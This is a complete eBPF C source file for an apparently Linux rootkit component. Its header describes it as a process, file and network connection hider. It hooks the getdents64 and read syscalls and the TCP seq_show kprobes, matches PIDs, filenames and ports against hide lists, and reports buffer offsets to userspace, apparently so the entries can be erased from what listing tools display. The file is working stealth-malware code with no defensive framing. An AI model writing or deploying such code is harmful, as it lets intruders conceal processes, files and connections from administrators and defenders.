//go:build ignore
// SPDX-License-Identifier: GPL-2.0
// Process, file & network connection hider
// Optimized for kernel 5.10 verifier complexity limits
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#define NAME_MAX 64

// Event types
#define EVT_HIDE_PID  1
#define EVT_HIDE_FILE 2
#define EVT_HIDE_NET  3

// Dirent hide event (PID and file hiding)
struct hide_event {
    u8  evt_type;
    u8  _pad0[3];
    u32 caller_pid;
    u32 caller_tid;
    u32 _pad1;
    u64 buf_addr;
    u64 entry_offset;
    u16 entry_reclen;
    u16 prev_reclen;
    u32 _pad2;
    u64 prev_offset;
    s64 total_size;
    char d_name[NAME_MAX];
};

// Network hide event
struct net_hide_event {
    u8  evt_type;       // EVT_HIDE_NET
    u8  _pad0[3];
    u32 caller_pid;
    u32 caller_tid;
    u16 local_port;
    u16 remote_port;
    u64 buf_addr;       // userspace read buffer
    s64 buf_len;        // bytes returned by read()
};

struct getdents_args { u64 dirp; };

struct { __uint(type, BPF_MAP_TYPE_HASH); __uint(max_entries, 1024);
         __type(key, u32); __type(value, struct getdents_args); } args_map SEC(".maps");

// --- PID hiding maps ---
struct { __uint(type, BPF_MAP_TYPE_ARRAY); __uint(max_entries, 1);
         __type(key, u32); __type(value, u64); } pid_val_map SEC(".maps");
struct { __uint(type, BPF_MAP_TYPE_ARRAY); __uint(max_entries, 1);
         __type(key, u32); __type(value, u64); } pid_mask_map SEC(".maps");

// --- File hiding maps ---
struct { __uint(type, BPF_MAP_TYPE_HASH); __uint(max_entries, 64);
         __type(key, u64); __type(value, u64); } file_name_map SEC(".maps");

// --- Network hiding maps ---
struct { __uint(type, BPF_MAP_TYPE_HASH); __uint(max_entries, 64);
         __type(key, u32); __type(value, u32); } hide_ports_map SEC(".maps");

// Per-tid net match flag (set by kprobe, consumed by sys_exit_read)
struct net_match {
    u16 local_port;
    u16 remote_port;
};
struct { __uint(type, BPF_MAP_TYPE_HASH); __uint(max_entries, 1024);
         __type(key, u32); __type(value, struct net_match); } net_match_map SEC(".maps");

// Per-tid read() buf address
struct read_args { u64 buf; };
struct { __uint(type, BPF_MAP_TYPE_HASH); __uint(max_entries, 1024);
         __type(key, u32); __type(value, struct read_args); } read_args_map SEC(".maps");

// Feature flags: 0=pid, 1=file, 2=net
struct { __uint(type, BPF_MAP_TYPE_ARRAY); __uint(max_entries, 3);
         __type(key, u32); __type(value, u32); } feature_map SEC(".maps");

struct { __uint(type, BPF_MAP_TYPE_RINGBUF);
         __uint(max_entries, 256 * 1024); } events SEC(".maps");

// ===== getdents64 hooks =====

SEC("tracepoint/syscalls/sys_enter_getdents64")
int tracepoint_sys_enter_getdents64(void *ctx)
{
    u64 id = bpf_get_current_pid_tgid();
    u32 tid = (u32)id;
    u64 dirp = 0;
    bpf_probe_read(&dirp, sizeof(dirp), ctx + 24);
    struct getdents_args a = { .dirp = dirp };
    bpf_map_update_elem(&args_map, &tid, &a, BPF_ANY);
    return 0;
}

static __always_inline void emit_dirent_event(u8 evt_type, u32 pid, u32 tid,
    u64 dirp, long off, u16 d_reclen, u16 prev_reclen,
    long prev_off, long ret, void *name_ptr)
{
    struct hide_event *e = bpf_ringbuf_reserve(&events, sizeof(struct hide_event), 0);
    if (!e) return;
    e->evt_type = evt_type;
    e->caller_pid = pid;
    e->caller_tid = tid;
    e->buf_addr = dirp;
    e->entry_offset = (u64)off;
    e->entry_reclen = d_reclen;
    e->prev_reclen = prev_reclen;
    e->prev_offset = (u64)prev_off;
    e->total_size = ret;
    bpf_probe_read_user_str(e->d_name, NAME_MAX, name_ptr);
    bpf_ringbuf_submit(e, 0);
}

SEC("tracepoint/syscalls/sys_exit_getdents64")
int tracepoint_sys_exit_getdents64(void *ctx)
{
    u64 id = bpf_get_current_pid_tgid();
    u32 tid = (u32)id;
    u32 pid = id >> 32;
    long ret = 0;
    bpf_probe_read(&ret, sizeof(ret), ctx + 16);

    struct getdents_args *a = bpf_map_lookup_elem(&args_map, &tid);
    if (!a) return 0;
    u64 dirp = a->dirp;
    bpf_map_delete_elem(&args_map, &tid);
    if (ret <= 0) return 0;

    u32 idx0 = 0, idx1 = 1;
    u32 *hide_pid_flag = bpf_map_lookup_elem(&feature_map, &idx0);
    u32 *hide_file_flag = bpf_map_lookup_elem(&feature_map, &idx1);
    u32 do_pid = hide_pid_flag ? *hide_pid_flag : 0;
    u32 do_file = hide_file_flag ? *hide_file_flag : 0;
    if (!do_pid && !do_file) return 0;

    u64 target = 0, mask = 0;
    if (do_pid) {
        u32 zero = 0;
        u64 *pv = bpf_map_lookup_elem(&pid_val_map, &zero);
        u64 *pm = bpf_map_lookup_elem(&pid_mask_map, &zero);
        if (pv) target = *pv;
        if (pm) mask = *pm;
    }

    long off = 0, prev_off = -1;
    u16 prev_reclen = 0;

    for (int i = 0; i < 256; i++) {
        if (off >= ret) break;
        u16 d_reclen = 0;
        if (bpf_probe_read_user(&d_reclen, 2, (void *)(dirp + off + 16)) < 0)
            break;
        if (d_reclen == 0 || d_reclen > 4096)
            break;

        u64 name_val = 0;
        bpf_probe_read_user(&name_val, 8, (void *)(dirp + off + 19));

        if (do_pid && mask && ((name_val & mask) == target)) {
            emit_dirent_event(EVT_HIDE_PID, pid, tid, dirp, off, d_reclen,
                       prev_reclen, prev_off, ret,
                       (void *)(dirp + off + 19));
        }
        else if (do_file) {
            u64 *fmask = bpf_map_lookup_elem(&file_name_map, &name_val);
            if (fmask) {
                emit_dirent_event(EVT_HIDE_FILE, pid, tid, dirp, off, d_reclen,
                           prev_reclen, prev_off, ret,
                           (void *)(dirp + off + 19));
            }
        }

        prev_off = off;
        prev_reclen = d_reclen;
        off += d_reclen;
    }
    return 0;
}

// ===== Network hiding via kprobe =====
// tcp4_seq_show(struct seq_file *seq, void *v)
// v == SEQ_START_TOKEN(1) = header, otherwise v = struct sock *
// struct sock starts with struct sock_common:
//   offset 12: __be16 skc_dport  (remote port, network byte order)
//   offset 14: __u16 skc_num     (local port, host byte order)

SEC("kprobe/tcp4_seq_show")
int kprobe_tcp4_seq_show(struct pt_regs *ctx)
{
    u32 idx2 = 2;
    u32 *do_net = bpf_map_lookup_elem(&feature_map, &idx2);
    if (!do_net || !*do_net) return 0;

    // arg2 = v (struct sock * or SEQ_START_TOKEN)
    u64 v = PT_REGS_PARM2(ctx);
    if (v == 1) return 0; // header line

    // Read ports from sock_common (at start of sock)
    u16 dport_be = 0, lport = 0;
    bpf_probe_read_kernel(&dport_be, 2, (void *)(v + 12)); // skc_dport
    bpf_probe_read_kernel(&lport, 2, (void *)(v + 14));     // skc_num

    u16 remote_port = __builtin_bswap16(dport_be);

    u32 lp = (u32)lport;
    u32 rp = (u32)remote_port;
    // Check each port separately to prevent compiler from merging pointers
    // (verifier rejects pointer |= pointer)
    int found = 0;
    u32 *hide_l = bpf_map_lookup_elem(&hide_ports_map, &lp);
    if (hide_l) found = 1;
    if (!found) {
        u32 *hide_r = bpf_map_lookup_elem(&hide_ports_map, &rp);
        if (hide_r) found = 1;
    }
    if (!found) return 0;

    u64 id = bpf_get_current_pid_tgid();
    u32 tid = (u32)id;
    struct net_match nm = { .local_port = lport, .remote_port = remote_port };
    bpf_map_update_elem(&net_match_map, &tid, &nm, BPF_ANY);
    return 0;
}

SEC("kprobe/tcp6_seq_show")
int kprobe_tcp6_seq_show(struct pt_regs *ctx)
{
    u32 idx2 = 2;
    u32 *do_net = bpf_map_lookup_elem(&feature_map, &idx2);
    if (!do_net || !*do_net) return 0;

    u64 v = PT_REGS_PARM2(ctx);
    if (v == 1) return 0;

    u16 dport_be = 0, lport = 0;
    bpf_probe_read_kernel(&dport_be, 2, (void *)(v + 12));
    bpf_probe_read_kernel(&lport, 2, (void *)(v + 14));
    u16 remote_port = __builtin_bswap16(dport_be);

    u32 lp = (u32)lport;
    u32 rp = (u32)remote_port;
    int found6 = 0;
    u32 *hide_l6 = bpf_map_lookup_elem(&hide_ports_map, &lp);
    if (hide_l6) found6 = 1;
    if (!found6) {
        u32 *hide_r6 = bpf_map_lookup_elem(&hide_ports_map, &rp);
        if (hide_r6) found6 = 1;
    }
    if (!found6) return 0;

    u64 id = bpf_get_current_pid_tgid();
    u32 tid = (u32)id;
    struct net_match nm = { .local_port = lport, .remote_port = remote_port };
    bpf_map_update_elem(&net_match_map, &tid, &nm, BPF_ANY);
    return 0;
}

// Track read() buffer address
SEC("tracepoint/syscalls/sys_enter_read")
int tracepoint_sys_enter_read(void *ctx)
{
    u32 idx2 = 2;
    u32 *do_net = bpf_map_lookup_elem(&feature_map, &idx2);
    if (!do_net || !*do_net) return 0;

    u64 id = bpf_get_current_pid_tgid();
    u32 tid = (u32)id;
    u64 buf = 0;
    bpf_probe_read(&buf, sizeof(buf), ctx + 24);
    struct read_args ra = { .buf = buf };
    bpf_map_update_elem(&read_args_map, &tid, &ra, BPF_ANY);
    return 0;
}

// On read() exit: if kprobe flagged this tid, emit net event
SEC("tracepoint/syscalls/sys_exit_read")
int tracepoint_sys_exit_read(void *ctx)
{
    u64 id = bpf_get_current_pid_tgid();
    u32 tid = (u32)id;
    u32 pid = id >> 32;

    struct read_args *ra = bpf_map_lookup_elem(&read_args_map, &tid);
    if (!ra) return 0;
    u64 buf = ra->buf;
    bpf_map_delete_elem(&read_args_map, &tid);

    struct net_match *nm = bpf_map_lookup_elem(&net_match_map, &tid);
    if (!nm) return 0;
    struct net_match saved = *nm;
    bpf_map_delete_elem(&net_match_map, &tid);

    long ret = 0;
    bpf_probe_read(&ret, sizeof(ret), ctx + 16);
    if (ret <= 0) return 0;

    struct net_hide_event *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e) return 0;
    e->evt_type = EVT_HIDE_NET;
    e->caller_pid = pid;
    e->caller_tid = tid;
    e->local_port = saved.local_port;
    e->remote_port = saved.remote_port;
    e->buf_addr = buf;
    e->buf_len = ret;
    bpf_ringbuf_submit(e, 0);
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
